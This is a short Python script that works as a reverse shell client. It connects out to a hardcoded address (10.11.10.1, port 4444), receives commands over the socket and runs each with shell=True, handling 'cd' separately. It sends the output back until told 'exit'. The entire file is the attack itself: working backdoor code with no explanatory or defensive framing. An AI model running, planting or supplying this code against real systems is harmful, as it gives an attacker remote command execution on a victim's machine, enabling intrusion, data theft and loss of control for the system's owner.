import socket
import subprocess
import os

HOST = '10.11.10.1'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    if command.startswith('cd '):
        try:
            os.chdir(command.strip('cd '))
            s.send(b'Directory changed\n')
        except:
            s.send(b'Failed to change directory\n')
        continue
    try:
        output = subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    if not output:
        output = b'Command executed\n'
    s.send(output)

s.close()
